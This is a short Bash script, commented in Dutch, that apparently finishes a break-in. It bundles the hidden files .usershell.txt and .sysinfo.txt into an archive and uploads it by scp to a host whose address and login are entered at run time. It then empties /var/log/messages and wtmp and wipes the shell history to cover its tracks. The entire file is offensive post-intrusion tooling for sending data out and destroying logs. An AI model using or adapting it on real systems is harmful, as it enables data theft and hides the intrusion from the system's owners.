#!/bin/bash
#cleanup script na het verkrijgen van de informatie

LOG_DIR=/var/log

ARRAY=(.usershell.txt .sysinfo.txt)


#begin met het zoeken en downloaden van de informatie
echo "waar staan de gemaakte bestanden?"
read SAVED_DIR

# maak een archive
if cd $SAVED_DIR; then
  mkdir .bingo
  for i in 1 2
  do
      mv ${ARRAY[$i-1]} .bingo
  done
  tar -cvf bingo.tar .bingo
  if ["$?" = "0"]; then
    echo "Archive made"
  else
    echo"Error tijdens maken van archive" 1>&2
    exit 1
  fi

  rm -R .bingo
else
  echo "Folder niet gevonden of niet kunnen switchen naar die folder"
  exit 1
fi

# upload de archive naar een host
echo "Ip adres van upload host:"
read IP_ADDR
echo "Username: "
read USER_NAME
echo "Password: "
read USER_PASS

if scp bingo.tar $USER_NAME@$IP_ADDR:/home/$USER_NAME; then
  echo "Upload succesvol"
else
  echo "Upload niet geslaagd"
  exit 1
fi

# als laatste verwijder de log files
cd $LOG_DIR

cat /dev/null > messages
cat /dev/null > wtmp

cat /dev/null > ~/.bash_history && history -w && history -c

exit 0
